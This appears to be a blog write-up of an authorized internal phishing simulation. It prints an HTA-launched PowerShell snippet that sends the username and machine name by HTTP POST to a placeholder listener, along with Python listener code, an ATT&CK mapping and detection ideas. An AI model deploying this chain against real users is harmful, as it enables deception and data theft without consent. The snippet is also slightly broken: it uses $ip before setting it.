---
layout: post
title: "Manual Phishing Simulation — From Payload
        Crafting to Data Collection"
date: 2026-02-21
categories: [Projects]
tags: [phishing, red-team, social-engineering,
       hta, powershell, simulation, blue-team]
---

## Context

Conducted an authorized internal phishing simulation
to assess user awareness and measure click-through
rates within the organization. Designed, executed,
and analyzed the campaign manually — no commercial
phishing platform used.

> Performed with full written authorization from
> management. All data collected was handled
> confidentially and deleted after reporting.

---

## Objective

- Measure how many users would interact with a
  realistic phishing email
- Simulate credential/system data exfiltration
  to demonstrate real-world impact
- Identify users requiring security awareness training

---

## Attack Chain

Phishing email sent to targets
- [ ] Link to "survey" page
- [ ] Page delivers .hta file (through manual download)
- [ ] User opens .hta
- [ ] PowerShell command executes when user hits submit
- [ ] Collects: %USERNAME%, %COMPUTERNAME%, IP address
- [ ] HTTP POST to attacker-controlled listener
- [ ] Data logged on Python HTTP server


---

## Payload — HTA + PowerShell

The `.hta` file used Windows Script Host to execute
a PowerShell command silently:

```powershell
$user = $env:USERNAME
$machine = $env:COMPUTERNAME
$ip = (Invoke-WebRequest -Uri "http://[listener-ip]/log" 
       -Method POST 
       -Body "user=$user&machine=$machine&ip=$ip").Content
```

Key design decisions:
- HTA chosen over direct executable — lower suspicion,
  opens via mshta.exe (trusted Windows binary)
- PowerShell used for native execution without
  additional dependencies
- No persistence, no lateral movement — simulation
  scoped to data collection only

---

## Infrastructure

Set up a lightweight Python HTTP server to receive
and log incoming connections:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        print(f"[+] Hit received: {data}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

Every time a user opened the `.hta` and PowerShell
executed, a log entry appeared with their username,
machine name, and IP.

---

## Results

- Data successfully received from multiple machines


---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Phishing | T1566.002 | Spearphishing via link |
| HTA Execution | T1218.005 | Signed binary proxy — mshta.exe |
| PowerShell | T1059.001 | Command execution via PowerShell |
| System Info Discovery | T1082 | Username, hostname, IP collection |
| Exfiltration over HTTP | T1041 | Data sent to attacker listener |

---

## Detection Opportunities

> This is the blue team flip: what would catch this?

- **Sysmon Event ID 1** — mshta.exe spawning
  PowerShell as child process
- **Network monitoring** — outbound HTTP POST to
  unknown external IP
- **PowerShell logging** — ScriptBlock logging
  captures the payload content
- **Email gateway** — .hta attachment or link to
  .hta download should be blocked by policy

---

## Key Takeaways

- HTA files are a living attack vector — widely
  underestimated by users and sometimes by AV
- Manual simulations reveal more than automated
  tools — you control every variable
- The same attack chain maps directly to detection
  rules — building the attack is the fastest way
  to understand what to hunt for